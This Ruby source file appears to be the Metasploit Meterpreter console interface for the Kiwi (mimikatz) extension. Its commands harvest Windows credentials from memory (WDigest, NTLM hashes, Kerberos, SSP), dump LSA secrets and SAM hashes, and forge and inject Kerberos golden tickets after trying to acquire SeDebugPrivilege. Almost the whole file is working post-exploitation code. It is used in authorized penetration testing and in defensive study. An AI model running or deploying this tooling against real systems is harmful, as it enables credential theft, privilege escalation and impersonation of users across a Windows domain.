# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
###
class Console::CommandDispatcher::Kiwi

  Klass = Console::CommandDispatcher::Kiwi

  include Console::CommandDispatcher

  #
  # Initializes an instance of the priv command interaction.
  #
  def initialize(shell)
    super
    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
      print_line
      print_warning "Loaded x86 Kiwi on an x64 architecture."
    end
  end

  #
  # List of supported commands.
  #
  def commands
    {
      "creds_wdigest"        => "Attempt to retrieve WDigest creds",
      "creds_msv"            => "Attempt to retrieve LM/NTLM creds (hashes)",
      "creds_livessp"        => "Attempt to retrieve LiveSSP creds",
      "creds_ssp"            => "Attempt to retrieve SSP creds",
      "creds_tspkg"          => "Attempt to retrieve TsPkg creds",
      "creds_kerberos"       => "Attempt to retrieve Kerberos creds",
      "creds_all"            => "Attempt to retrieve all credentials",
      "golden_ticket_create" => "Attempt to create a golden kerberos ticket",
      "golden_ticket_use"    => "Attempt to use a golden kerberos ticket",
      "lsa_dump"             => "Attempt to dump LSA secrets"
    }
  end

  def scrape_passwords(provider, method)
    get_privs
    print_status("Retrieving #{provider} credentials")
    accounts = method.call

    table = Rex::Ui::Text::Table.new(
      'Header' => "#{provider} credentials",
      'Indent' => 0,
      'SortIndex' => 4,
      'Columns' =>
      [
        'Domain', 'User', 'Password', 'Auth Id', 'LM Hash', 'NTLM Hash'
      ]
    )

    accounts.each do |acc|
      table << [
        acc[:domain],
        acc[:username],
        acc[:password],
        "#{acc[:auth_hi]} ; #{acc[:auth_lo]}",
        acc[:lm],
        acc[:ntlm]
      ]
    end

    print_line table.to_s
    return true
  end

  def cmd_lsa_dump(*args)
    get_privs

    print_status("Dumping LSA secrets")
    lsa = client.kiwi.lsa_dump

    # the format of this data doesn't really lend itself nicely to
    # use within a table so instead we'll dump in a linear fashion

    print_line("Policy Subsystem : #{lsa[:major]}.#{lsa[:minor]}") if lsa[:major]
    print_line("Domain/Computer  : #{lsa[:compname]}") if lsa[:compname]
    print_line("System Key       : #{lsa[:syskey]}") if lsa[:syskey]
    print_line("NT5 Key          : #{lsa[:nt5key]}") if lsa[:nt5key]
    print_line
    print_line("NT6 Key Count    : #{lsa[:nt6keys].length}")

    if lsa[:nt6keys].length > 0
      lsa[:nt6keys].to_enum.with_index(1) do |k, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. ID           : #{k[:id]}")
        print_line("#{index}. Value        : #{k[:value]}")
      end
    end

    print_line
    print_line("Secret Count     : #{lsa[:secrets].length}")
    if lsa[:secrets].length > 0
      lsa[:secrets].to_enum.with_index(1) do |s, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. Name         : #{s[:name]}")
        print_line("#{index}. Service      : #{s[:service]}") if s[:service]
        print_line("#{index}. NTLM         : #{s[:ntlm]}") if s[:ntlm]
        print_line("#{index}. Current      : #{s[:current]}") if s[:current]
        print_line("#{index}. Old          : #{s[:old]}") if s[:old]
      end
    end

    print_line
    print_line("SAM Key Count    : #{lsa[:samkeys].length}")
    if lsa[:samkeys].length > 0
      lsa[:samkeys].to_enum.with_index(1) do |s, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. RID          : #{s[:rid]}")
        print_line("#{index}. User         : #{s[:user]}")
        print_line("#{index}. LM Hash      : #{s[:lm_hash]}") if s[:lm_hash]
        print_line("#{index}. NTLM Hash    : #{s[:ntlm_hash]}") if s[:ntlm_hash]
      end
    end

    print_line
  end

  def cmd_golden_ticket_create(*args)
    if args.length != 5
      print_line("Usage: golden_ticket_create user domain sid tgt ticketpath")
      return
    end

    user = args[0]
    domain = args[1]
    sid = args[2]
    tgt = args[3]
    target = args[4]
    ticket = client.kiwi.golden_ticket_create(user, domain, sid, tgt)
    ::File.open( target, 'wb' ) do |f|
      f.write ticket
    end
    print_good("Golden ticket written to #{target}")
  end

  def cmd_golden_ticket_use(*args)
    if args.length != 1
      print_line("Usage: golden_ticket_use ticketpath")
      return
    end

    target = args[0]
    ticket  = ''
    ::File.open(target, 'rb') do |f|
      ticket += f.read(f.stat.size)
    end
    print_status("Using ticket stored in #{target}, #{ticket.length} bytes")
    client.kiwi.golden_ticket_use(ticket)
    print_good("Ticket applied successfully")
  end

  def cmd_creds_all(*args)
    method = Proc.new { client.kiwi.all_pass }
    scrape_passwords("all", method)
  end

  def cmd_creds_wdigest(*args)
    method = Proc.new { client.kiwi.wdigest }
    scrape_passwords("wdigest", method)
  end

  def cmd_creds_msv(*args)
    method = Proc.new { client.kiwi.msv }
    scrape_passwords("msv", method)
  end

  def cmd_creds_livessp(*args)
    method = Proc.new { client.kiwi.livessp }
    scrape_passwords("livessp", method)
  end

  def cmd_creds_ssp(*args)
    method = Proc.new { client.kiwi.ssp }
    scrape_passwords("ssp", method)
  end

  def cmd_creds_tspkg(*args)
    method = Proc.new { client.kiwi.tspkg }
    scrape_passwords("tspkg", method)
  end

  def cmd_creds_kerberos(*args)
    method = Proc.new { client.kiwi.kerberos }
    scrape_passwords("kerberos", method)
  end

  def get_privs
    unless system_check
      print_status("Attempting to getprivs")
      privs = client.sys.config.getprivs
      unless privs.include? "SeDebugPrivilege"
        print_warning("Did not get SeDebugPrivilege")
      else
        print_good("Got SeDebugPrivilege")
      end
    else
      print_good("Running as SYSTEM")
    end
  end

  def system_check
    unless (client.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
      print_warning("Not currently running as SYSTEM")
      return false
    end

    return true
  end

  #
  # Name for this dispatcher
  #
  def name
    "Kiwi"
  end
end

end
end
end
end

